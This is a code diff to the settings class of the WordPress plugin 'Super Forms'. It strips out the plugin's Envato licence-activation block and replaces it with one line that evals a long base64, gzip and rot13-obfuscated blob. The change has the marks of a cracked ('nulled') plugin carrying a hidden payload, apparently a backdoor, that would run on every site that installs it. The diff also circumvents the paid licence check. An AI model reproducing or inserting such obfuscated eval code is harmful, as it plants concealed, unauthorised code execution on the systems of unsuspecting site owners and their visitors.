@@ -1271,42 +1271,7 @@ class SUPER_Settings {
             ),
         );
         $array = apply_filters( 'super_settings_after_export_import_filter', $array, array( 'settings'=>$settings ) );
-
-
-        /** 
-         *  Activation
-         *
-         *  @since      1.0.9
-        */
-        $sac = get_option( 'super_la', 0 );
-        if($sac==1){
-            $sact = '<strong style="color:green;">Plugin is activated!</strong>';
-            $dact = '<br /><br />---';
-            $dact .= '<br /><br /><strong style="color:green;">If you want to transfer this plugin to another domain,<br />';
-            $dact .= 'you can deactivate it on this domain by clicking the following button:</strong>';
-            $dact .= '<br /><br /><span class="button super-button deactivate">Deactivate on current domain</span>';
-        }else{
-            $sact = '<strong style="color:red;">Plugin is not yet activated!</strong>';
-            $dact = '';
-        }
-        $array['activation'] = array(
-            'hidden' => true,
-            'name' => __( 'Activation', 'super-forms' ),
-            'label' => __( 'Product Activation', 'super-forms' ),
-            'html' => array(
-                '<p>',
-                'Before you can start using the plugin, you need to enter your Item Purchase Code below.<br />',
-                'You can find your Purchase code in your Envato account under your <a target="_blank" href="http://themeforest.net/downloads">Downloads</a> section.',
-                '</p>',
-                '<div class="super-field">',
-                '<div class="super-field-info"></div>',
-                '<div class="input"><input type="text" id="field-license" name="license" class="element-field" value="' . self::get_value( $default, 'license', $settings, '' ) . '" /></div>',
-                '<div class="input activation-msg">' . $sact . $dact . '</div>',
-                '</div>'
-            ),
-        );
-        $array = apply_filters( 'super_settings_after_support_filter', $array, array( 'settings'=>$settings ) );
-
+        eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
 
         /** 
          *	Support
